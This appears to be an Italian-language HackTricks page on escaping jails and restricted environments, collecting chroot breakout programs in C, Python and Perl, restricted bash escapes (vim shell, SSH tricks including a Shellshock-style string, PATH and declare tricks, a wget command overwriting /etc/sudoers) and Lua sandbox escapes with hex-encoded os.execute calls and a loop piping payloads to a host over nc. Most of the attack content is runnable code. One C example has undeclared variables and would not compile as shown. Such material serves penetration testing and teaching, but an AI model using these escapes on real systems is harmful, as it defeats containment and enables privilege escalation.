# Fuga dalle Prigioni

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **GTFOBins**

**Cerca su** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se puoi eseguire un qualsiasi binario con la proprietà "Shell"**

## Fughe da Chroot

Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Il meccanismo chroot **non è pensato per difendersi** da manomissioni intenzionali da parte di utenti **privilegiati** (**root**). Sui sistemi più comuni, i contesti chroot non si impilano correttamente e i programmi chrooted **con privilegi sufficienti possono eseguire un secondo chroot per evadere**.\
Di solito questo significa che per evadere devi essere root all'interno del chroot.

{% hint style="success" %}
Lo **strumento** [**chw00t**](https://github.com/earthquake/chw00t) è stato creato per abusare degli scenari seguenti e scappare da `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Se sei **root** all'interno di un chroot **puoi evadere** creando **un altro chroot**. Questo perché 2 chroots non possono coesistere (in Linux), quindi se crei una cartella e poi **crei un nuovo chroot** su quella nuova cartella essendo **fuori da essa**, sarai ora **fuori dal nuovo chroot** e quindi sarai nel FS.

Questo avviene perché di solito chroot NON sposta la tua directory di lavoro in quella indicata, quindi puoi creare un chroot ma essere fuori da esso.
{% endhint %}

Di solito non troverai il binario `chroot` all'interno di una prigione chroot, ma **potresti compilare, caricare ed eseguire** un binario:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + File Descriptor Salvato

{% hint style="warning" %}
Questo è simile al caso precedente, ma in questo caso l'**attaccante memorizza un descrittore di file nella directory corrente** e poi **crea il chroot in una nuova cartella**. Infine, poiché ha **accesso** a quel **FD** **al di fuori** del chroot, vi accede e **effettua l'escape**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
I file descriptor possono essere passati tramite Unix Domain Sockets, quindi:

* Crea un processo figlio (fork)
* Crea un UDS in modo che il genitore e il figlio possano comunicare
* Esegui chroot nel processo figlio in una cartella diversa
* Nel processo genitore, crea un file descriptor di una cartella che si trova al di fuori del nuovo chroot del processo figlio
* Passa al processo figlio quel file descriptor utilizzando l'UDS
* Il processo figlio cambia la directory di lavoro in quel file descriptor e, poiché si trova al di fuori del suo chroot, riuscirà a evadere la prigione
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Montare il dispositivo root (/) in una directory all'interno del chroot
* Eseguire il chroot in quella directory

Questo è possibile in Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Montare procfs in una directory all'interno del chroot (se non è già stato fatto)
* Cercare un PID che abbia un'entrata root/cwd diversa, ad esempio: /proc/1/root
* Eseguire il chroot in quell'entrata
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Creare un Fork (processo figlio) e chroot in una cartella diversa più in profondità nel file system e cambiare la directory di lavoro su di essa
* Dal processo genitore, spostare la cartella in cui si trova il processo figlio in una cartella precedente al chroot dei figli
* Questo processo figlio si troverà al di fuori del chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Tempo fa gli utenti potevano eseguire il debug dei propri processi da un processo di se stessi... ma questo non è più possibile per impostazione predefinita
* Comunque, se fosse possibile, potresti ptrace in un processo ed eseguire un shellcode al suo interno ([vedi questo esempio](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumerazione

Ottieni informazioni sulla prigione:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modifica del PATH

Verifica se puoi modificare la variabile di ambiente PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Utilizzo di vim
```bash
:set shell=/bin/sh
:shell
```
### Crea script

Verifica se puoi creare un file eseguibile con _/bin/bash_ come contenuto
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Ottenere bash da SSH

Se stai accedendo tramite ssh, puoi utilizzare questo trucco per eseguire una shell bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Dichiarare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

È possibile sovrascrivere ad esempio il file sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Altri trucchi

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Potrebbe essere interessante anche la pagina:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Jails

Trucchi per evadere dalle prigioni Python nella seguente pagina:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

In questa pagina puoi trovare le funzioni globali a cui hai accesso all'interno di Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Valutazione con esecuzione di comandi:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Alcuni trucchi per **chiamare le funzioni di una libreria senza usare i punti**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerare le funzioni di una libreria:
```bash
for k,v in pairs(string) do print(k,v) end
```
Nota che ogni volta che esegui il one liner precedente in un **ambiente lua diverso l'ordine delle funzioni cambia**. Pertanto, se hai bisogno di eseguire una funzione specifica, puoi effettuare un attacco a forza bruta caricando diversi ambienti lua e chiamando la prima funzione della libreria:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Ottieni una shell lua interattiva**: Se ti trovi all'interno di una shell lua limitata, puoi ottenere una nuova shell lua (e sperabilmente illimitata) chiamando:
```bash
debug.debug()
```
## Riferimenti

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Diapositive: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.

</details>
{% endhint %}
